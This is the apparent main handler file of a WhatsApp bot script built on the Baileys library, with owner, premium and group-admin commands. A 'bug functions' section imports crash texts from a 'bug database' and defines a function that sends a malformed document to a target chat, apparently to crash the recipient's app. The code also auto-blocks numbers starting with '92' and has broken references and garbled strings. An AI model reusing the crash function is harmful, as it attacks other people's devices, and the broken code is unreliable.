//base by God's Zeal Tech
//re-upload? recode? copy code? give credit ya :)
//YouTube: @AiOFLautech
//Instagram: 
//Telegram: t.me/
//GitHub: @AiOfLautech
//WhatsApp: +2348089336992
//want more free bot scripts? subscribe to my youtube channel: https://youtube.com/@AiOFLautech
//Also Fork This Bot: https://github.com/AiOfLautech/God-s-Zeal-Xmd

const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@whiskeysockets/baileys')
const os = require('os')
const fs = require('fs')
const fsx = require('fs-extra')
const path = require('path')
const util = require('util')
const chalk = require('chalk')
const moment = require('moment-timezone')
const speed = require('performance-now')
const ms = toMs = require('ms')
const axios = require('axios')
const fetch = require('node-fetch')
const { exec, spawn, execSync } = require("child_process")
const { performance } = require('perf_hooks')
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
const { TelegraPh, UploadFileUgu, webp2mp4File, floNime } = require('./lib/uploader')
const { toAudio, toPTT, toVideo, ffmpeg, addExifAvatar } = require('./lib/converter')
const { smsg, getGroupAdmins, formatp, jam, formatDate, getTime, isUrl, await, sleep, clockString, msToDate, sort, toNumber, enumGetKey, runtime, fetchJson, getBuffer, json, delay, format, logic, generateProfilePicture, parseMention, getRandom, pickRandom, reSize } = require('./lib/myfunc')
let afk = require("./lib/afk");
const { addPremiumUser, getPremiumExpired, getPremiumPosition, expiredCheck, checkPremiumUser, getAllPremiumUser } = require('./lib/premiun')
const { fetchBuffer, buffergif } = require("./lib/myfunc2")

//bug database
const { godszealtext1 } = require('./69/godszealtext1')
const { godszealtext2 } = require('./69/godszealtext2')
const { godszealtext3 } = require('./69/godszealtext3')
const { godszealtext4 } = require('./69/godszealtext4')
const { godszealtext5 } = require('./69/godszealtext5')
const { godszealtext6 } = require('./69/godszealtext6')

//database
let premium = JSON.parse(fs.readFileSync('./database/premium.json'))
let _owner = JSON.parse(fs.readFileSync('./database/owner.json'))
let owner = JSON.parse(fs.readFileSync('./database/owner.json'))
let _afk = JSON.parse(fs.readFileSync('./database/afk-user.json'))
let hit = JSON.parse(fs.readFileSync('./database/total-hit-user.json'))

//autorep
const VoiceNoteGODSZEAL = JSON.parse(fs.readFileSync('./database/autoreply/vn.json'))
const StickerGODSZEAL = JSON.parse(fs.readFileSync('./database/autoreply/sticker.json'))
const ImageGODSZEAL = JSON.parse(fs.readFileSync('./database/autoreply/image.json'))
const VideoGODSZEAL = JSON.parse(fs.readFileSync('./database/autoreply/video.json'))
const DocGODSZEAL = JSON.parse(fs.readFileSync('./database/autoreply/doc.json'))
const ZipGODSZEAL = JSON.parse(fs.readFileSync('./database/autoreply/zip.json'))
const ApkGODSZEAL = JSON.parse(fs.readFileSync('./database/autoreply/apk.json'))

//time
const xtime = moment.tz('Asia/Kolkata').format('HH:mm:ss')
        const xdate = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
        const time2 = moment().tz('Asia/Kolkata').format('HH:mm:ss')  
         if(time2 < "23:59:00"){
var godszealytimewisher = `Good Night 🌌`
 }
 if(time2 < "19:00:00"){
var godszealytimewisher = `Good Evening 🌃`
 }
 if(time2 < "18:00:00"){
var godszealytimewisher = `Good Evening 🌃`
 }
 if(time2 < "15:00:00"){
var godszealytimewisher = `Good Afternoon 🌅`
 }
 if(time2 < "11:00:00"){
var godszealytimewisher = `Good Morning 🌄`
 }
 if(time2 < "05:00:00"){
var godszealytimewisher = `Good Morning 🌄`
 } 
module.exports = GODSZEALBotInc = async (GODSZEALBotInc, m, msg, chatUpdate, store) => {
    try {
        const {
            type,
            quotedMsg,
            mentioned,
            now,
            fromMe
        } = m
        var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectreplygcgodszeal.selectedRowId : (m.mtype == 'templateButtonreplygcgodszealMessage') ? m.message.templateButtonreplygcgodszealMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectreplygcgodszeal.selectedRowId || m.text) : ''
        var budy = (typeof m.text == 'string' ? m.text : '')
        var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
        const isCmd = body.startsWith(prefix)
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const full_args = body.replace(command, '').slice(1).trim()
        const pushname = m.pushName || "No Name"
        const botNumber = await GODSZEALBotInc.decodeJid(GODSZEALBotInc.user.id)
        const itsMe = m.sender == botNumber ? true : false
        const sender = m.sender
        const text = q = args.join(" ")
        const from = m.key.remoteJid
        const fatkuns = (m.quoted || m)
        const quoted = (fatkuns.mtype == 'buttonsMessage') ? fatkuns[Object.keys(fatkuns)[1]] : (fatkuns.mtype == 'templateMessage') ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : (fatkuns.mtype == 'product') ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const qmsg = (quoted.msg || quoted)
        const isMedia = /image|video|sticker|audio/.test(mime)
        const isImage = (type == 'imageMessage')
        const isVideo = (type == 'videoMessage')
        const isAudio = (type == 'audioMessage')
        const isText = (type == 'textMessage')
        const isSticker = (type == 'stickerMessage')
        const isQuotedText = type === 'extendexTextMessage' && content.includes('textMessage')
        const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
        const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
        const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
        const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
        const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
        const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
        const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
        const sticker = []
        const isAfkOn = afk.checkAfkUser(m.sender, _afk)
        const isGroup = m.key.remoteJid.endsWith('@g.us')
        const groupMetadata = m.isGroup ? await GODSZEALBotInc.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
        const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
        const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
        const isGroupOwner = m.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false
        const isCreator = [ownernumber, ..._owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const isPremium = isCreator || isCreator || checkPremiumUser(m.sender, premium);
        expiredCheck(GODSZEALBotInc, m, premium);
//group chat msg by godszeal
const replygcgodszeal = (teks) => {
GODSZEALBotInc.sendMessage(m.chat,
{ text: teks,
contextInfo:{
mentionedJid:[sender],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./modsMedia/thumb.jpg`),
"sourceUrl": `${link}`}}},
{ quoted: m})
}

//bug functions
const godszealimun = (texto) => {
GODSZEALBotInc.sendMessage(from, { text: texto, mentions: [sender]}, {quoted: m }).catch(e => {
return reply("Erro..")
})
}

const subscribe_Godszeal = {
"key": { 
"fromMe": false,
"participant": '0@s.whatsapp.net',
"remoteJid": 'status@broadcast' 
},
message: {
"listResponseMessage": {
title: `𝐆𝐨𝐝'𝐬 𝐙𝐞𝐚𝐥 ur father`
}}
}
async function GODSZEALyCrashy(dggodszeal,chat) {
GODSZEALBotInc.sendMessage(chat, {
document: {url: './settings.js'},
mimetype: `image/null`,
fileName: `${Godszeal}.${godszealtext1}` ,
caption: `${Godszeal + godszealtext1}`,
}, {quoted: subscribe_Godszeal })
}
//end bug functions

async function loading () {
var godszeallod = [
"《 █▒▒▒▒▒▒▒▒▒▒▒》10%",
"《 ████▒▒▒▒▒▒▒▒》30%",
"《 ███████▒▒▒▒▒》50%",
"《 ██████████▒▒》80%",
"《 ████████████》100%",
"𝙻𝙾𝙰𝙳𝙸𝙽𝙶 𝙲𝙾𝙼𝙿𝙻𝙴𝚃𝙴𝙳 🦄..."
]
let { key } = await GODSZEALBotInc.sendMessage(from, {text: 'ʟᴏᴀᴅɪɴɢ...'})

for (let i = 0; i < godszeallod.length; i++) {
await GODSZEALBotInc.sendMessage(from, {text: godszeallod[i], edit: key });
}
}

        if (!GODSZEALBotInc.public) {
            if (!isCreator && !m.key.fromMe) return
        }
        if (autoread) {
            GODSZEALBotInc.readMessages([m.key])
        }
        if (global.autoTyping) {

        GODSZEALBotInc.sendPresenceUpdate('composing', from)


        }

        if (global.autoRecording) {

        GODSZEALBotInc.sendPresenceUpdate('recording', from)

        }

        
        //bot number online status, available=online, unavailable=offline
        GODSZEALBotInc.sendPresenceUpdate('unavail 11 Ofable', from)
        
        if (global.autorecordtype) {
        let godszealrecordin = ['recording','composing']

        let godszealrecordinfinal = godszealrecordin[Math.floor(Math.random() * godszealrecordin.length)]

        GODSZEALBotInc.sendPresenceUpdate(godszealrecordinfinal, from)

        }
        
        if (autobio) {
            GODSZEALBotInc.updateProfileStatus(`24/7 Online Bot By ${ownername}`).catch(_ => _)
        }
        if (m.sender.startsWith('92') && global.anti92 === true) {
            return GODSZEALBotInc.updateBlockStatus(m.sender, 'block')
        }
        let list = []
        for (let i of owner) {
list.push({
	    	displayName: await GODSZEALBotInc.getName(i),
	    	vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await GODSZEALBotInc.getName(i)}\nFN:${await GODSZEALBotInc.getName(i)}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${ytname}\nitem2.X-ABLabel:YouTube\nitem3.URL:${socialm}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
	    })
	}
	
	//chat counter (console log)
        if (m.message && m.isGroup) {
            console.log(chalk.cyan(`\n< ================================================== >\n`))
			console.log(chalk.green(`Group Chat:`))
            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> In'), chalk.green(groupName, m.chat))
        } else {
            console.log(chalk.cyan(`\n< ================================================== >\n`))
			console.log(chalk.green(`Private Chat:`))
            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender))
        }

        if (command) {
            const cmdadd = () => {
                hit[0].hit_cmd += 1
                fs.writeFileSync('./database/total-hit-user.json', JSON.stringify(hit))
            }
            cmdadd()
            const totalhit = JSON.parse(fs.readFileSync('./database/total-hit-user.json'))[0].hit_cmd
        }
        
for (let BhosdikaGODSZEAL of VoiceNoteGODSZEAL) {
if (budy === BhosdikaGODSZEAL) {
let audiobuffy = fs.readFileSync(`./modsMedia/audio/${BhosdikaGODSZEAL}.mp3`)
GODSZEALBotInc.sendMessage(m.chat, { audio: audiobuffy, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
}
}
for (let BhosdikaGODSZEAL of StickerGODSZEAL){
if (budy === BhosdikaGODSZEAL){
let stickerbuffy = fs.readFileSync(`./modsMedia/sticker/${BhosdikaGODSZEAL}.webp`)
GODSZEALBotInc.sendMessage(m.chat, { sticker: stickerbuffy }, { quoted: m })
}
}
for (let BhosdikaGODSZEAL of ImageGODSZEAL){
if (budy === BhosdikaGODSZEAL){
let imagebuffy = fs.readFileSync(`./modsMedia/image/${BhosdikaGODSZEAL}.jpg`)
GODSZEALBotInc.sendMessage(m.chat, { image: imagebuffy }, { quoted: m })
}
}
for (let BhosdikaGODSZEAL of VideoGODSZEAL){
if (budy === BhosdikaGODSZEAL){
let videobuffy = fs.readFileSync(`./modsMedia/video/${BhosdikaGODSZEAL}.mp4`)
GODSZEALBotInc.sendMessage(m.chat, { video: videobuffy }, { quoted: m })
}
}

const sendapk = (teks) => {
GODSZEALBotInc.sendMessage(from, { document: teks, mimetype: 'application/vnd.android.package-archive'}, {quoted:m})
}
for (let BhosdikaGODSZEAL of ApkGODSZEAL) {
if (budy === BhosdikaGODSZEAL) {
let buffer = fs.readFileSync(`./modsMedia/apk/${BhosdikaGODSZEAL}.apk`)
sendapk(buffer)
}
}

const sendzip = (teks) => {
GODSZEALBotInc.sendMessage(from, { document: teks, mimetype: 'application/zip'}, {quoted:m})
}
for (let BhosdikaGODSZEAL of ZipGODSZEAL) {
if (budy === BhosdikaGODSZEAL) {
let buffer = fs.readFileSync(`./modsMedia/zip/${BhosdikaGODSZEAL}.zip`)
sendzip(buffer)
}
}

const senddocu = (teks) => {
haikal.sendMessage(from, { document: teks, mimetype: 'application/pdf'}, {quoted:m})
}
for (let BhosdikaGODSZEAL of DocGODSZEAL) {
if (budy === BhosdikaGODSZEAL) {
let buffer = fs.readFileSync(`./modsMedia/doc/${BhosdikaGODSZEAL}.pdf`)
senddocu(buffer)
}
}
        
        if (m.isGroup && !m.key.fromMe) {
            let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
            for (let ment of mentionUser) {
                if (afk.checkAfkUser(ment, _afk)) {
                    let getId2 = afk.getAfkId(ment, _afk)
                    let getReason2 = afk.getAfkReason(getId2, _afk)
                    let getTimee = Date.now() - afk.getAfkTime(getId2, _afk)
                    let heheh2 = ms(getTimee)
                    replygcgodszeal(`Don't tag him, he's afk\n\n*Reason :* ${getReason2}`)
                }
            }
            if (afk.checkAfkUser(m.sender, _afk)) {
                let getId = afk.getAfkId(m.sender, _afk)
                let getReason = afk.getAfkReason(getId, _afk)
                let getTime = Date.now() - afk.getAfkTime(getId, _afk)
                let heheh = ms(getTime)
                _afk.splice(afk.getAfkPosition(m.sender, _afk), 1)
                fs.writeFileSync('./database/afk-user.json', JSON.stringify(_afk))
                GODSZEALBotInc.sendTextWithMentions(m.chat, `@${m.sender.split('@')[0]} have returned from afk`, m)
            }
        }
        switch (command) {
            case 'addprem':
                if (!isCreator) return replygcgodszeal(mess.owner)
                if (args.length < 2)
                    return replygcgodszeal(`Use :\n*#addprem* @tag time\n*#addprem* number time\n\nExample : #addprem @tag 30d`);
                if (m.mentionedJid.length !== 0) {
                    for (let i = 0; i < m.mentionedJid.length; i++) {
                        addPremiumUser(m.mentionedJid[0], args[1], premium);
                    }
                    replygcgodszeal("Premium Success")
                } else {
                    addPremiumUser(args[0] + "@s.whatsapp.net", args[1], premium);
                    replygcgodszeal("Success")
                }
                break
            case 'delprem':
                if (!isCreator) return replygcgodszeal(mess.owner)
                if (args.length < 1) return replygcgodszeal(`Use :\n*#delprem* @tag\n*#delprem* number`);
                if (m.mentionedJid.length !== 0) {
                    for (let i = 0; i < m.mentionedJid.length; i++) {
                        premium.splice(getPremiumPosition(m.mentionedJid[i], premium), 1);
                        fs.writeFileSync("./database/premium.json", JSON.stringify(premium));
                    }
                    replygcgodszeal("Delete success")
                } else {
                    premium.splice(getPremiumPosition(args[0] + "@s.whatsapp.net", premium), 1);
                    fs.writeFileSync("./database/premium.json", JSON.stringify(premium));
                    replygcgodszeal("Success")
                }
                break
            case 'listprem': {
                if (!isCreator) return replygcgodszeal(mess.owner)
                let data = require("./database/premium.json")
                let txt = `*------「 LIST PREMIUM 」------*\n\n`
                for (let i of data) {
                    txt += `Number : ${i.id}\n`
                    txt += `Expired : ${i.expired} Second\n`         
                }                
                GODSZEALBotInc.sendMessage(m.chat, {
                    text: txt,
                    mentions: i
                }, {
                    quoted: m
                })
            }
            break
            case 'deletesession':
            case 'delsession':
            case 'clearsession': {
                if (!isCreator) return replygcgodszeal(mess.owner)
                fs.readdir("./session", async function(err, files) {
                    if (err) {
                        console.log('Unable to scan directory: ' + err);
                        return replygcgodszeal('Unable to scan directory: ' + err);
                    }
                    let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
                        item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
                    )
                    console.log(filteredArray.length);
                    let teks = `Detected ${filteredArray.length} junk files\n\n`
                    if (filteredArray.length == 0) return replygcgodszeal(teks)
                    filteredArray.map(function(e, i) {
                        teks += (i + 1) + `. ${e}\n`
                    })
                    replygcgodszeal(teks)
                    await sleep(2000)
                    replygcgodszeal("Delete junk files...")
                    await filteredArray.forEach(function(file) {
                        fs.unlinkSync(`./session/${file}`)
                    });
                    await sleep(2000)
                    replygcgodszeal("Successfully deleted all the trash in the session folder")
                });
            }
            break
            case 'join':
                try {
                    if (!isCreator) return replygcgodszeal(mess.owner)
                    if (!text) return replygcgodszeal('Enter Group Link!')
                    if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return replygcgodszeal('Link Invalid!')
                    replygcgodszeal(mess.wait)
                    let result = args[0].split('https://chat.whatsapp.com/')[1]
                    await GODSZEALBotInc.groupAcceptInvite(result).then((res) => replygcgodszeal(json(res))).catch((err) => replygcgodszeal(json(err)))
                } catch {
                    replygcgodszeal('Failed to join the Group')
                }
                break      
            case 'getsession':
                if (!isCreator) return replygcgodszeal(mess.owner)
                replygcgodszeal('Wait a moment, currently retrieving your session file')
                let sesi = await fs.readFileSync('./session/creds.json')
                GODSZEALBotInc.sendMessage(m.chat, {
                    document: sesi,
                    mimetype: 'application/json',
                    fileName: 'creds.json'
                }, {
                    quoted: m
                })
                break
            case 'shutdown':
                if (!isCreator) return replygcgodszeal(mess.owner)
                replygcgodszeal(`Goodbye🖐`)
                await sleep(3000)
                process.exit()
                break
            case 'restart':
                if (!isCreator) return replygcgodszeal(mess.owner)
                replygcgodszewl('In Process....')
                exec('pm2 restart all')
                break
            case 'autoread':
                if (!isCreator) return replygcgodszeal(mess.owner)
                if (args.length < 1) return replygcgodszeal(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    autoread = true
                    replygcgodszeal(`Successfully changed autoread to ${q}`)
                } else if (q === 'off') {
                    autoread = false
                    replygcgodszeal(`Successfully changed autoread to ${q}`)
                }
                break
                case 'autotyping':
                if (!isCreator) return replygcgodszeal(mess.owner)
                if (args.length < 1) return replygcgodszeal(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    autoTyping = true
                    replygcgodszeal(`Successfully changed auto-typing to ${q}`)
                } else if (q === 'off') {
                    autoTyping = false
                    replygcgodszeal(`Successfully changed auto-typing to ${q}`)
                }
                break
                case 'autorecording':
                if (!isCreator) return replygcgodszeal(mess.owner)
                if (args.length < 1) return replygcgodszeal(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    autoRecording = true
                    replygcgodszeal(`Successfully changed auto-recording to ${q}`)
                } else if (q === 'off') {
                    autoRecording = false
                    replygcgodszeal(`Successfully changed auto-recording to ${q}`)
                }
                break
                case 'autorecordtyp':
                if (!isCreator) return replygcgodszeal(mess.owner)
                if (args.length < 1) return replygcgodszeal(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    autorecordtype = true
                    replygcgodszeal(`Successfully changed auto recording and typing to ${q}`)
                } else if (q === 'off') {
                    autorecordtype = false
                    replygcgodszeal(`Successfully changed auto recording and typing to ${q}`)
                }
                break
                case 'autoswview':
    case 'autostatusview':{
             if (!isCreator) return GODSZEALStickOwner()
               if (args.length < 1) return replygcgodszeal('on/off?')
               if (args[0] === 'on') {
                  autoswview = true
                  replygcgodszeal(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  autoswview = false
                  replygcgodszeal(`${command} is disabled`)
               }
            }
            break
            case 'autobio':
                if (!isCreator) return replygcgodszeal(mess.owner)
                if (args.length < 1) return replygcgodszeal(`Example ${prefix + command} on/off`)
                if (q == 'on') {
                    autobio = true
                    replygcgodszeal(`Successfully Changed AutoBio To ${q}`)
                } else if (q == 'off') {
                    autobio = false
                    replygcgodszeal(`Successfully Changed AutoBio To ${q}`)
                }
                break
            case 'mode':
                if (!isCreator) return replygcgodszeal(mess.owner)
                if (args.length < 1) return replygcgodszeal(`Example ${prefix + command} public/self`)
                if (q == 'public') {
                    GODSZEALBotInc.public = true
                    replygcgodszeal(mess.done)
                } else if (q == 'self') {
                    GODSZEALBotInc.public = false
                    replygcgodszeal(mess.done)
                }
                break
            case 'setexif':
                if (!isCreator) return replygcgodszeal(mess.owner)
                if (!text) return replygcgodszeal(`Example : ${prefix + command} packname|author`)
                global.packname = text.split("|")[0]
                global.author = text.split("|")[1]
                replygcgodszeal(`Exif successfully changed to\n\n• Packname : ${global.packname}\n• Author : ${global.author}`)
                break
            case 'setpp':
            case 'setpp':
            case 'setppbot':
                if (!isCreator) return replygcgodszeal(mess.owner)
                if (!quoted) return replygcgodszeal(`Send/Reply Image With Caption ${prefix + command}`)
                if (!/image/.test(mime)) return replygcgodszeal(`Send/Reply Image With Caption ${prefix + command}`)
                if (/webp/.test(mime)) return replygcgodszeal(`Send/Reply Image With Caption ${prefix + command}`)
                var medis = await GODSZEALBotInc.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                if (args[0] == 'full') {
                    var {
                        img
                    } = await generateProfilePicture(medis)
                    await GODSZEALBotInc.query({
                        tag: 'iq',
                        attrs: {
                            to: botNumber,
                            type: 'set',
                            xmlns: 'w:profile:picture'
                        },
                        content: [{
                            tag: 'picture',
                            attrs: {
                                type: 'image'
                            },
                            content: img
                        }]
                    })
                    fs.unlinkSync(medis)
                    replygcgodszeal(mess.done)
                } else {
                    var memeg = await GODSZEALBotInc.updateProfilePicture(botNumber, {
                        url: medis
                    })
                    fs.unlinkSync(medis)
                    replygcgodszeal(mess.done)
                }
                break
            case 'block':
                if (!isCreator) return replygcgodszeal(mess.owner)
                let blockw = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await GODSZEALBotInc.updateBlockStatus(blockw, 'block').then((res) => replygcgodszeal(json(res))).catch((err) => replygcgodszeal(json(err)))
                break
            case 'unblock':
                if (!isCreator) return replygcgodszeal(mess.owner)
                let blockww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await GODSZEALBotInc.updateBlockStatus(blockww, 'unblock').then((res) => replygcgodszeal(json(res))).catch((err) => replygcgodszeal(json(err)))
                break
            case 'leave':
                if (!isCreator) return replygcgodszeal(mess.owner)
                if (!m.isGroup) return replygcgodszeal(mess.group)
                replygcgodszeal('Bye Everyone 🥺')
                await GODSZEALBotInc.groupLeave(m.chat)
                break
            case 'backup':
                if (!isCreator) return replygcgodszeal(mess.owner)
                if (m.isGroup) return replygcgodszeal(mess.private)
                replygcgodszeal(mess.wait)
                exec('zip backup.zip *')
                let malas = await fs.readFileSync('./backup.zip')
                await GODSZEALBotInc.sendMessage(m.chat, {
                    document: malas,
                    mimetype: 'application/zip',
                    fileName: 'backup.zip'
                }, {
                    quoted: m
                })
                break
            case 'bcgc':
            case 'bcgroup': {
                if (!isCreator) return replygcgodszeal(mess.owner)
                if (!text) return replygcgodszeal(`Which text?\n\nExample : ${prefix + command} It's holiday tomorrow `)
                let getGroups = await GODSZEALBotInc.groupFetchAllParticipating()
                let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
                let anu = groups.map(v => v.id)
                replygcgodszeal(`Send Broadcast To ${anu.length} Group Chat, End Time ${anu.length * 1.5} second`)
                for (let i of anu) {
                    await sleep(1500)
                    let a = '```' + `\n\n${text}\n\n` + '```' + '\n\n\nʙʀᴏᴀᴅᴄᴀsᴛ'
                    GODSZEALBotInc.sendMessage(i, {
                        text: a,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: 'Broadcast By Owner',
                                body: `Sent ${i.length} Group`,
                                thumbnailUrl: 'https://telegra.ph/file/c02035e9c30f7b6da1b29.jpg',
                                sourceUrl: global.link,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    })
                }
                replygcgodszeal(`Successfully Sent Broadcast To ${anu.length} Group`)
            }
            break
            case 'getcase':
                if (!isCreator) return replygcgodszeal(mess.owner)
                const getCase = (cases) => {
                    return "case" + `'${cases}'` + fs.readFileSync("GODSZEALBug4.js").toString().split('case \'' + cases + '\'')[1].split("break")[0] + "break"
                }
                replygcgodszeal(`${getCase(q)}`)
                break
            case 'delete':
            case 'del': {
                if (!isCreator) return replygcgodszeal(mess.done)
                if (!m.quoted) throw false
                let {
                    chat,
                    fromMe,
                    id,
                    isBaileys
                } = m.quoted
                if (!isBaileys) return replygcgodszeal('The message was not sent by a bot!')
                GODSZEALBotInc.sendMessage(m.chat, {
                    delete: {
                        remoteJid: m.chat,
                        fromMe: true,
                        id: m.quoted.id,
                        participant: m.quoted.sender
                    }
                })
            }
            break

            case 'closetime':
                if (!m.isGroup) return replygcgodszeal(mess.group)
                if (!isAdmins && !isCreator) return replygcgodszeal(mess.admin)
                if (!isBotAdmins) return replygcgodszeal(mess.botAdmin)
                if (args[1] == 'detik') {
                    var timer = args[0] * `1000`
                } else if (args[1] == 'menit') {
                    var timer = args[0] * `60000`
                } else if (args[1] == 'jam') {
                    var timer = args[0] * `3600000`
                } else if (args[1] == 'hari') {
                    var timer = args[0] * `86400000`
                } else {
                    return replygcgodszeal('*Choose:*\nsecond\nminute\nhour\nday\n\n*Example*\n10 second')
                }
                replygcgodszeal(`Close time ${q} starting from now`)
                setTimeout(() => {
                    var nomor = m.participant
                    const close = `*Closed* group closed by admin\nnow only admin can send messages`
                    GODSZEALBotInc.groupSettingUpdate(m.chat, 'announcement')
                    replygcgodszeal(close)
                }, timer)
                break
            case 'opentime':
                if (!m.isGroup) return replygcgodszeal(mess.group)
                if (!isAdmins && !isCreator) return replygcgodszeal(mess.admin)
                if (!isBotAdmins) return replygcgodszeal(mess.botAdmin)
                if (args[1] == 'second') {
                    var timer = args[0] * `1000`
                } else if (args[1] == 'minute') {
                    var timer = args[0] * `60000`
                } else if (args[1] == 'hour') {
                    var timer = args[0] * `3600000`
                } else if (args[1] == 'day') {
                    var timer = args[0] * `86400000`
                } else {
                    return replygcgodszeal('*Choose:*\nsecond\nminute\nhour\nday\n\n*Example*\n10 second')
                }
                replygcgodszeal(`Open time ${q} starting from now`)
                setTimeout(() => {
                    var nomor = m.participant
                    const open = `*Opened* The group is opened by admin\nNow members can send messages`
                    GODSZEALBotInc.groupSettingUpdate(m.chat, 'not_announcement')
                    replygcgodszeal(open)
                }, timer)
                break
            case 'kick':
                if (!m.isGroup) return replygcgodszeal(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcgodszeal(mess.admin)
                if (!isBotAdmins) return replygcgodszeal(mess.botAdmin)
                let blockwww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await GODSZEALBotInc.groupParticipantsUpdate(m.chat, [blockwww], 'remove').then((res) => replygcgodszeal(json(res))).catch((err) => replygcgodszeal(json(err)))
                break
            case 'add':
                if (!m.isGroup) return replygcgodszeal(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcgodszeal(mess.admin)
                if (!isBotAdmins) return replygcgodszeal(mess.botAdmin)
                let blockwwww = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await GODSZEALBotInc.groupParticipantsUpdate(m.chat, [blockwwww], 'add').then((res) => replygcgodszeal(json(res))).catch((err) => replygcgodszeal(json(err)))
                break
            case 'promote':
                if (!m.isGroup) return replygcgodszeal(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcgodszeal(mess.admin)
                if (!isBotAdmins) return replygcgodszeal(mess.botAdmin)
                let blockwwwww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await GODSZEALBotInc.groupParticipantsUpdate(m.chat, [blockwwwww], 'promote').then((res) => replygcgodszeal(json(res))).catch((err) => replygcgodszeal(json(err)))
                break
            case 'demote':
                if (!m.isGroup) return replygcgodszeal(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcgodszeal(mess.admin)
                if (!isBotAdmins) return replygcgodszeal(mess.botAdmin)
                let blockwwwwwa = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await GODSZEALBotInc.groupParticipantsUpdate(m.chat, [blockwwwwwa], 'demote').then((res) => replygcgodszeal(json(res))).catch((err) => replygcgodszeal(json(err)))
                break
            case 'setname':
            case 'setsubject':
                if (!m.isGroup) return replygcgodszeal(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcgodszeal(mess.admin)
